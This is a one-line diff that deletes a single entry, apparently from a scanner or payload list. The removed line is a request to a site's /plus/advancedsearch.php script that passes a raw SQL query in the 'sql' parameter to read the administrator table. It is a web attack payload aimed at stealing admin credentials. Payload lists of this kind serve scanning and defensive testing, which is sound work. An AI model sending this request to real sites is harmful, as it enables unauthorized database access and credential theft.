@@ -1,1 +1,0 @@
-/plus/advancedsearch.php?mid=1&sql=SELECT%20*%20FROM%20`%23@__admin`
